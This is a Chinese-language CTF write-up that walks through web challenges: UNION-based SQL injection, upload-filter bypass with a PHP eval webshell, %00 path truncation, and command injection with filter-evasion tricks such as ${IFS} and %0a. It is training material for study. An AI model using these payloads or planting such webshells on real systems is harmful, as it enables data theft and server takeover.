整数型注入

1 2 3 分别输入可以看到页面有两处显示位置，所以判断有两处sql语句插入位置。也可以验证一下。先用1 order by 2验证一下字段数量，然后-1 union select 1,2 看显示位置

  1. 获取数据库名
    -1 union select 1,database() 得到数据库sqli
  2. 获取所有数据库库名
    id=-1 union select 1,group_concat(schema_name)from information_schema.schemata
  3. 获取所有表名
    id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'
  4. 获取字段名
    id=-1 union select 1,(select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 0,1)
  5. 获取flag
    id=-1 union select 1,(select flag from flag)

前端验证

这题采用了前端验证，对于上传的文件名字后缀有要求，只能是jpg，png，gif。若是我们上传php就会被拒绝，查看源代码后我们可以看到该过滤只是基于前端的过滤，只要提交的时候文件是图片格式就可以通过前端。

于是把一句话木马的php文件后缀名改为png上传，然后用bp抓包把png再改回来php，上传到服务器。可以看到返回的上传地址，蚁剑连接得到flag。

00截断

看源代码可以看到文件被上传后会重命名，这样我们就很难找到上传的木马。
提示说是php 5.2版本的00截断，应该是在上传路径截断。
抓包能看到请求连接处包含road参数，把参数那行修改为?road=/var/www/html/upload/yogurt.php%00 下边filename改不改都行。
然后蚁剑连接就ok
move_uploaded_file函数读取$res时，读到%00发生截断，存入路径就截到yogurt.php，所以绕过了。

命令注入-无过滤

这题打开是有一个输入框输入ip，还有代码。
起初我输入127.0.0.1 可以执行，后来输入127.0.0.1|ls 也可以执行，显示该目录下有几个文件，其中有24941029230210.php，于是执行127.0.0.1|cat 24941029230210.php
发现并没有flag，于是看了源代码发现了flag。
还可以输入127.0.0.1|cat 24941029230210.php|base64 可以把flag以base64形式输出

过滤cat

根据题干我们了解到cat被过滤了，
但是我们可以写文件
127.0.0.1 & echo "<?php eval(\$_POST['aaa']);?>">1.php
然后蚁剑或者菜刀连接即可

过滤空格

过滤了空格就找字符代替空格，${IFS}
IFS$9、%09、<、>、<>、{,}、%20、${IFS}

这里只有这句成功了
127.0.0.1|cat${IFS}flag_2886922976782.php

过滤目录分隔符

执行127.0.0.1|ls
得到目录：flag_is_here
执行127.0.0.1;cd flag_is_here;ls
得到文件名：flag_314751225517726.php
执行127.0.0.1;cd flag_is_here;cat flag_314751225517726.php
得到flag

过滤运算符

这题管道符被过滤，还是要127.0.0.1；ls来查看了。
看到有个文件flag_10681224622826.php
然后127.0.0.1;cat flag_10681224622826.php
查看源代码得到flag

综合练习

这会过滤了|、&、；、空格、/、cat、flag、ctfhub
空格用${IFS}代替，cat用more代替，flag用正则f，命令分隔符可以用%0a(%0a必须在url中输入，如果在别的地方输入可能会被再次编码)
首先：127.0.0.1%0als
得到文件：flag_is_here
然后：`127.0.0.1%0acd${IFS}f_is_here%0als`
得到文件：flag_121742558328979.php

然后执行下面第一种，flag会以base64形式显示在页面，执行第二种，flag会在源码中。
